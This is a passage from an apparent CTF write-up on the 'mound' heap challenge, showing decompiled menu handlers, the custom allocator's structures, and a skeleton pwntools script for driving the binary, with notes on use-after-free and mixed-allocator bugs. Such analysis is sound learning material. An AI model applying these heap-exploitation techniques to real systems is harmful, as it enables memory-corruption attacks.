</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>default</span><span class=o>:</span>
</span></span><span class=line><span class=cl>        <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Cya later :p&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>That&rsquo;s pretty long. Let&rsquo;s break it up into two segments: the preamble, and the <code>while(1)</code> loop.</p><h3 id=preamble>Preamble</h3><p><code>main()</code> doesn&rsquo;t have a lot of variables.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>user_sz</span><span class=p>;</span> <span class=c1>// [rsp+8h] [rbp-118h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>idx</span><span class=p>;</span> <span class=c1>// [rsp+Ch] [rbp-114h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>s</span><span class=p>[</span><span class=mh>0x110</span><span class=p>];</span> <span class=c1>// [rsp+10h] [rbp-110h] BYREF
</span></span></span></code></pre></td></tr></table></div></div><p>The 3 variables here are user-editable, and we&rsquo;ll talk about them later. Just keep in mind that <code>user_sz</code> and <code>idx</code> are <strong>unsigned</strong> integers written to with <code>scanf("%d")</code> calls later on, and <code>s[]</code> is written to with a non-overflowing, non-zero-terminating<sup>1</sup> <code>read()</code> call.</p><p>After this, <code>main()</code> runs a bunch of initialisers:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>  <span class=n>setvbuf</span><span class=p>(...);</span>      <span class=c1>// all 3 i/o streams are unbuffered
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>install_seccomp</span><span class=p>();</span> <span class=c1>// start seccomp filter as shown at the start of this writeup
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>puts</span><span class=p>(...);</span>    <span class=c1>// intro message
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>moundsetup</span><span class=p>();</span> <span class=c1>// setup the &#34;mound&#34;; this challenge&#39;s heap implementation
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>memset</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x100uLL</span><span class=p>);</span> <span class=c1>// don&#39;t think too much about this; s[] can still be used for a leak if you try hard enough
</span></span></span></code></pre></td></tr></table></div></div><p>The only complicated function here is <code>moundsetup()</code>; skip ahead to <a href=#mound rel>this part of the writeup</a> if you want to understand it. If not:</p><h3 id=mains-loop><code>main()</code>&rsquo;s loop</h3><p>The CLI gives five options:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1. Add sand
</span></span><span class=line><span class=cl>2. Add dirt
</span></span><span class=line><span class=cl>3. Replace dirt
</span></span><span class=line><span class=cl>4. Remove dirt
</span></span><span class=line><span class=cl>5. Go home
</span></span></code></pre></td></tr></table></div></div><p>Here&rsquo;s a skeleton script to deal with the options:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwnscripts</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=s1>&#39;mound&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>libc</span> <span class=o>=</span> <span class=s1>&#39;libc.so.6&#39;</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>process</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>choose</span><span class=p>(</span><span class=n>opt</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span> <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>opt</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>strdup</span><span class=p>(</span><span class=n>s</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>,</span> <span class=n>i</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>choose</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Pile: &#39;</span><span class=p>,</span> <span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;index: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>sz</span><span class=p>:</span> <span class=nb>int</span><span class=p>,</span> <span class=n>idx</span><span class=p>:</span> <span class=nb>int</span><span class=p>,</span> <span class=n>s</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>choose</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=n>sz</span> <span class=o>&lt;</span> <span class=mh>0x1000</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=nb>len</span><span class=p>(</span><span class=n>s</span><span class=p>)</span> <span class=o>&lt;=</span> <span class=n>sz</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;pile: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>sz</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;index: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;Pile: &#39;</span><span class=p>,</span> <span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>idx</span><span class=p>:</span> <span class=nb>int</span><span class=p>,</span> <span class=n>s</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>choose</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;index: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;pile: &#39;</span><span class=p>,</span> <span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=n>idx</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>choose</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;index: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>  
</span></span></code></pre></td></tr></table></div></div><p>(5) just calls <code>exit(0)</code>, but the rest are more complex.</p><h4 id=add-sand>Add sand</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>case</span> <span class=mi>1</span><span class=o>:</span> <span class=c1>// really bad things
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>getinput</span><span class=p>(</span><span class=s>&#34;Pile: &#34;</span><span class=p>,</span> <span class=n>s</span><span class=p>,</span> <span class=mh>0x100uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Pile index: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>idx</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>idx</span> <span class=o>&gt;</span> <span class=mh>0xF</span> <span class=p>)</span> <span class=n>REJECT</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>arr</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=n>strdup</span><span class=p>(</span><span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>sizes</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=n>strlen</span><span class=p>(</span><span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>break</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>This option is really weird. A user-inputted stream of bytes – not necessarily nul-terminated – are sent to <code>strdup</code>, and the resultant <em>glibc malloc&rsquo;d string</em> is stored at <code>arr[idx]</code>. This means that some of <code>arr[]</code>&rsquo;s elements can be a mixture of <em>mound</em> pointers, and actual glibc heap pointers.</p><p>It&rsquo;s also worth noting that the <code>str*</code> functions here can overflow, depending on whether the stack has extra nul-bytes or not.</p><h4 id=add-dirt>Add dirt</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>case</span> <span class=mi>2</span><span class=o>:</span> <span class=c1>// add
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Size of pile: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>user_sz</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>user_sz</span> <span class=o>&lt;=</span> <span class=mh>0xFFF</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Pile index: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>idx</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>idx</span> <span class=o>&gt;</span> <span class=mh>0xF</span> <span class=p>)</span> <span class=n>REJECT</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>arr</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=n>mmalloc</span><span class=p>(</span><span class=n>user_sz</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>sizes</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>getinput</span><span class=p>(</span><span class=s>&#34;Pile: &#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>arr</span><span class=p>[</span><span class=n>idx</span><span class=p>],</span> <span class=n>user_sz</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>else</span> <span class=n>puts</span><span class=p>(</span><span class=s>&#34;A bit too much dirt my friend.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>break</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>So this is a little bit interesting. The maximum allocation size is <code>0xfff</code>; <code>user_sz</code> is an <code>unsigned</code> so the single-bounded comparison works out. For some reason, <code>sizes[idx]</code> is set to <code>0</code> instead of <code>user_sz</code>. This is a little bit weird because of <code>case 3</code>:</p><h4 id=replace-dirt>Replace dirt</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>case</span> <span class=mi>3</span><span class=o>:</span> <span class=c1>// edit
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Pile index: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>idx</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>idx</span> <span class=o>&gt;</span> <span class=mh>0xF</span> <span class=o>||</span> <span class=o>!</span><span class=n>arr</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>||</span> <span class=o>!</span><span class=n>sizes</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=p>)</span> <span class=n>REJECT</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>getinput</span><span class=p>(</span><span class=s>&#34;New pile: &#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>arr</span><span class=p>[</span><span class=n>idx</span><span class=p>],</span> <span class=n>sizes</span><span class=p>[</span><span class=n>idx</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  <span class=k>break</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p><code>sizes[idx]</code> has to be non-zero for the edit to pass. Since Option 2 sets <code>sizes[idx]</code> to 0, <code>arr[idx]</code> can only be edited if it&rsquo;s a pointer from the glibc heap in <code>case 1</code>, or if <code>sizes[idx]</code> can be modified somewhere else.</p><h4 id=remove-dirt>Remove dirt</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>case</span> <span class=mi>4</span><span class=o>:</span> <span class=c1>// free
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Pile index: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>idx</span><span class=p>);</span> <span class=c1>// remember that `idx` itself is typed as unsigned.
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>if</span> <span class=p>(</span> <span class=n>idx</span> <span class=o>&lt;=</span> <span class=mh>0xF</span> <span class=o>&amp;&amp;</span> <span class=n>arr</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>mfree</span><span class=p>(</span><span class=n>arr</span><span class=p>[</span><span class=n>idx</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=n>sizes</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>else</span> <span class=n>REJECT</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>break</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>This option calls <code>mfree()</code> on <code>arr[idx]</code>. There&rsquo;s only one bug here, and it&rsquo;s that <code>arr[idx]</code> is not zeroed.</p><p>So, this is a little bit odd. There are obvious Bad Things going on in these options, but the exploit required isn&rsquo;t immediately obvious here. I&rsquo;ll need to dive deeper into the <code>mound</code> implementation.</p><h2 id=mound>Mound</h2><p>The <code>mound</code> is kind of like the glibc heap, if it had nothing but the tcache.</p><p>At the start of the program, the <code>mound</code> grabs two big memory spaces from <code>mmap</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=mh>0x00000beef0000000</span> <span class=mh>0x00000beef0400000</span> <span class=mh>0x0000000000000000</span> <span class=n>rw</span><span class=o>-</span>
</span></span><span class=line><span class=cl><span class=mh>0x00000dead0000000</span> <span class=mh>0x00000dead0009000</span> <span class=mh>0x0000000000000000</span> <span class=n>rw</span><span class=o>-</span>
</span></span></code></pre></td></tr></table></div></div><p><code>0xbeef*</code> stores the actual data distributed by <code>mmalloc</code>; I&rsquo;ll call it <code>mound_data</code>. At the beginning of its life, the entirety of the <code>mound_data</code> segment constitutes the &ldquo;top chunk&rdquo; of the <code>mound</code>.</p><p><code>0xdead*</code> stores the metadata for the <code>mound</code>, kind of like what <code>main_arena</code> does in glibc. The structure looks something like this:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=n>mound_metadata</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=o>*</span><span class=n>mound_base</span><span class=p>;</span> <span class=c1>// = 0xbeef0000000; never used for anything
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>size_t</span> <span class=n>ids</span><span class=p>[</span><span class=mh>0x1000</span><span class=p>];</span> <span class=c1>// rand64() ids assigned to every chunk allocated by mmalloc.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>mcache_struct</span> <span class=o>*</span><span class=n>mcache</span><span class=p>;</span> <span class=c1>// tcache, but for the mound.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>mchunk</span> <span class=o>*</span><span class=n>top</span><span class=p>;</span> <span class=c1>// pointer to the top chunk
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span> <span class=n>mound_metadata</span><span class=p>;</span> <span class=c1>// sizeof(mound_metadata) == 0x8018
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>mound_metadata</span> <span class=n>mound_arena</span><span class=p>;</span> <span class=c1>// cs:0xdead0000000
</span></span></span></code></pre></td></tr></table></div></div><p>The new types in there are further defined like so:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=n>mchunk</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>size_t</span> <span class=n>id</span><span class=p>;</span> <span class=c1>// rand64() id.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>size_t</span> <span class=n>sz</span><span class=p>;</span> <span class=c1>// the chunk size (inclusive of metadata)
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>char</span> <span class=n>data</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span> <span class=c1>// length is dependent on the size provided to mmalloc() 
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=n>mcache_entry</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>mchunk</span><span class=p>;</span> <span class=c1>// i.e. extend/inherit the mchunk structure here
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>mcache_struct</span> <span class=o>*</span><span class=n>mcache</span><span class=p>;</span> <span class=c1>// a copy of the mcache for safety verification
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>mcache_entry</span> <span class=o>*</span><span class=n>next</span><span class=p>;</span> <span class=c1>// next mcache entry; this is a linked list like the tcache.
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>#define MCACHE_MAX_BINS 0x18
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=k>typedef</span> <span class=k>struct</span> <span class=n>mcache_struct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span> <span class=n>counts</span><span class=p>[</span><span class=n>MCACHE_MAX_BINS</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=n>mcache_entry</span> <span class=o>*</span><span class=n>entries</span><span class=p>[</span><span class=n>MCACHE_MAX_BINS</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>The most interesting part of each <code>mchunk</code> is (in my opinion, anyway) the <code>id</code> element. Every chunk is assigned a random 64-bit UUID (with a very small chance of collision<sup>2</sup>) upon allocation. When a chunk is freed, that ID gets chucked into the <code>mound_metadata</code> to protect the program against a double-free.</p><p>This might make a lot more sense if I give a flowchart of how things work:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/blog/rarctf-2021-the-mound/Diagram.png data-srcset="/blog/rarctf-2021-the-mound/Diagram.png, /blog/rarctf-2021-the-mound/Diagram.png 1.5x, /blog/rarctf-2021-the-mound/Diagram.png 2x" data-sizes=auto alt=/blog/rarctf-2021-the-mound/Diagram.png title=/blog/rarctf-2021-the-mound/Diagram.png width=691 height=501></p><p>Relevant macros:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#define request2size(x) ((-x&amp;0xf)+x+0x10) </span><span class=c1>// x rounded up to nearest 0x10, plus 0x10. Applies for -ve numbers too.
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#define csize2midx(x) ((x&gt;&gt;4)-2)
</span></span></span><span class=line><span class=cl><span class=cp>#define chunk2mem(p) ((void*)p+0x10)
</span></span></span><span class=line><span class=cl><span class=cp>#define mem2chunk(p) ((void*)p-0x10)
</span></span></span></code></pre></td></tr></table></div></div><p>I copied and adapted some of these to python as well:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>csize2midx</span><span class=p>(</span><span class=n>x</span><span class=p>:</span><span class=nb>int</span><span class=p>):</span> <span class=k>return</span> <span class=p>(</span><span class=n>x</span><span class=o>&gt;&gt;</span><span class=mi>4</span><span class=p>)</span><span class=o>-</span><span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>midx2csize</span><span class=p>(</span><span class=n>i</span><span class=p>:</span><span class=nb>int</span><span class=p>):</span> <span class=k>return</span> <span class=p>(</span><span class=n>i</span><span class=o>+</span><span class=mi>2</span><span class=p>)</span><span class=o>&lt;&lt;</span><span class=mi>4</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>size2request</span><span class=p>(</span><span class=n>x</span><span class=p>:</span><span class=nb>int</span><span class=p>):</span> <span class=k>return</span> <span class=n>x</span><span class=o>-</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>request2size</span><span class=p>(</span><span class=n>x</span><span class=p>:</span><span class=nb>int</span><span class=p>):</span> <span class=k>return</span> <span class=n>x</span><span class=o>+</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>midx2rsize</span><span class=p>(</span><span class=n>i</span><span class=p>:</span><span class=nb>int</span><span class=p>):</span> <span class=k>return</span> <span class=n>size2request</span><span class=p>(</span><span class=n>midx2csize</span><span class=p>(</span><span class=n>i</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>With this high-level overview of the implementation in mind, I can return to the previous question: What are the consequences of sending a glibc heap pointer to <code>mfree()</code>?</p><h3 id=mixing-heap-allocators>Mixing heap allocators</h3><p>Simply freeing a glibc heap pointer will almost certainly produce an <code>exit(1)</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1. Add sand
</span></span><span class=line><span class=cl>2. Add dirt
</span></span><span class=line><span class=cl>3. Replace dirt
</span></span><span class=line><span class=cl>4. Remove dirt
</span></span><span class=line><span class=cl>5. Go home
</span></span><span class=line><span class=cl>&gt; 1
</span></span><span class=line><span class=cl>Pile: hi
</span></span><span class=line><span class=cl>Pile index: 0
</span></span><span class=line><span class=cl>1. Add sand
</span></span><span class=line><span class=cl>2. Add dirt
</span></span><span class=line><span class=cl>3. Replace dirt
</span></span><span class=line><span class=cl>4. Remove dirt
</span></span><span class=line><span class=cl>5. Go home
</span></span><span class=line><span class=cl>&gt; 4
</span></span><span class=line><span class=cl>Pile index: 0
</span></span><span class=line><span class=cl>Mound: Double free detected
</span></span></code></pre></td></tr></table></div></div><p>The relevant part of the code to check is the <code>find_id(c->id)</code> call:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
